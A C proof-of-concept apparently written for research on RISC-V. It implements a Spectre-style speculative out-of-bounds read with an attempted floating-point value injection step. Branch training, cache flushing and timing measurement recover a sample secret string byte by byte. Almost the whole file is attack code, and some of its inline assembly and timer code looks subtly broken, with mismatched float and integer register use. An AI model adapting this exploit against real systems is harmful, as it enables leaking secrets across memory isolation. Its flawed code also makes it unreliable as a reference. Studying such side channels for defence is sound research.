#include <stdio.h>
#include <stdint.h>
#include "encoding.h"     
#include "cache.h"        

/****************************************************************************
 * Configurazioni generali
 ***************************************************************************/
#define L1_BLOCK_SZ_BYTES     64
#define CACHE_THRESHOLD       32    
#define SECRET_LEN            32
#define NUM_TRAIN             50    
#define NUM_ROUNDS            1
#define SAME_ATTACK_ROUNDS    10   

/****************************************************************************
 * Variabili globali e buffer di esempio
 ***************************************************************************/
uint64_t array1_size = 16;

uint8_t  padding1[64];
uint8_t  array1[160] = {
    1,2,3,4,5,6,7,8,
    9,10,11,12,13,14,15,16
};
uint8_t  padding2[64];
uint8_t  array2[256 * L1_BLOCK_SZ_BYTES];

// Segreto di esempio
char* secretStr = "abcdefghijklmnopqrstuvwxyz123456";


/****************************************************************************
 * Legge il contatore di cicli (se presente)
 ***************************************************************************/
static inline uint64_t getCycle() {
#ifdef __riscv
    return rdcycle();
#else
    // fallback per host non RISC-V
    uint64_t time;
    __asm__ __volatile__("rdtsc" : "=A"(time));
    return time;
#endif
}

/****************************************************************************
 * Misurazione tempo di accesso a un indirizzo
 ***************************************************************************/
uint64_t measureAccessTime(uint8_t *addr) {
    uint64_t start = getCycle();
    (void)(*addr);
    return getCycle() - start;
}

/****************************************************************************
 * Trova i due indici con più "hit"
 ***************************************************************************/
void findTopTwo(uint64_t* inputArray, uint64_t inputSize,
                uint8_t* outputIdxArray, uint64_t* outputValArray) {
    outputValArray[0] = 0;
    outputValArray[1] = 0;

    for (uint64_t i = 0; i < inputSize; ++i) {
        if (inputArray[i] > outputValArray[0]) {
            outputValArray[1] = outputValArray[0];
            outputValArray[0] = inputArray[i];
            outputIdxArray[1] = outputIdxArray[0];
            outputIdxArray[0] = i;
        } else if (inputArray[i] > outputValArray[1]) {
            outputValArray[1] = inputArray[i];
            outputIdxArray[1] = i;
        }
    }
}

/****************************************************************************
 * Funzione vittima con tentativo di FPVI
 *
 * - Eliminato lo shift su array1_size per evitare complicazioni.
 * - Ridotto il numero di fdiv per non saturare la pipeline 
 * - Usato un valore subnormale un po' più "grande" di 1.0e-45f (ad es. 5.0e-39f)
 ***************************************************************************/
void victimFunction(uint64_t idx, float attackerFloatVal) {
    register uint8_t dummy = 0;

    float subnormalResult;
    asm volatile(
        // Carica attackerFloatVal in fa1
        "fcvt.s.w   fa1, %[in1]       \n"
        // Esegui qualche divisione, sperando che generi subnormal e assist
        "fdiv.s     fa1, fa1, fa1     \n"
        "fdiv.s     fa1, fa1, fa1     \n"

        // Converti indietro a intero (forzando rounding)
        "fcvt.w.s   %[out1], fa1, rtz \n"
        : [out1] "=r" (subnormalResult)
        : [in1] "r"  (attackerFloatVal)
        : "fa1"
    );

    // Tentativo di OOB speculativo
    if (idx < array1_size) {
        dummy &= array2[array1[idx] * L1_BLOCK_SZ_BYTES];
    }

    // Usa subnormalResult per non farlo ottimizzare via dead-code
    dummy += (uint8_t)subnormalResult;

    // Piccola barriera "fittizia"
    asm volatile("" ::: "memory");

    dummy += (uint8_t)getCycle(); // bounding speculation
}

/****************************************************************************
 * main
 ***************************************************************************/
int main(void) {
    uint64_t attackIdx = (uint64_t)(secretStr - (char*)array1);
    static uint64_t results[256];

    for (uint64_t i = 0; i < SECRET_LEN; ++i) {
        for (uint64_t j = 0; j < 256; ++j) {
            results[j] = 0;
        }


        for(uint64_t round = 0; round < SAME_ATTACK_ROUNDS; ++round) {
            // Flush cache
            flushCache((uint64_t)array2, sizeof(array2));

            for(int64_t k = ((NUM_TRAIN + 1 + (round & 1)) * NUM_ROUNDS) - 1; k >= 0; --k) {
                uint64_t randomIdx = round % array1_size;

                uint64_t inputIdx = ((k % (NUM_TRAIN + 1 + (round & 1))) - 1) & ~0xFFFF;
                inputIdx = (inputIdx | (inputIdx >> 16));
                inputIdx = randomIdx ^ (inputIdx & (attackIdx ^ randomIdx));

                // Valore subnormale un po' più grande di 1e-45
                float attackerFloatVal = 5.0e-39f;

                // Chiama la vittima
                victimFunction(inputIdx, attackerFloatVal);
            }

            // Lettura canale da array2
            for (uint64_t m = 0; m < 256; ++m) {
                uint64_t duration = measureAccessTime(&array2[m * L1_BLOCK_SZ_BYTES]);
                if (duration < CACHE_THRESHOLD) {
                    results[m]++;
                }
            }
        }

        // Trova i due byte più "probabili"
        uint8_t bestGuess[2];
        uint64_t bestHits[2];
        findTopTwo(results, 256, bestGuess, bestHits);

        // Stampa risultato
        printf("Leak[%2lu]: indirizzo = 0x%p, atteso(%c), ipotesi: "
               "1.(hits=%lu, dec=%3d, char=%c) 2.(hits=%lu, dec=%3d, char=%c)\n", 
               i, (uint8_t*)(array1 + attackIdx), secretStr[i],
               bestHits[0], bestGuess[0], bestGuess[0],
               bestHits[1], bestGuess[1], bestGuess[1]);

        attackIdx++;
    }

    return 0;
}

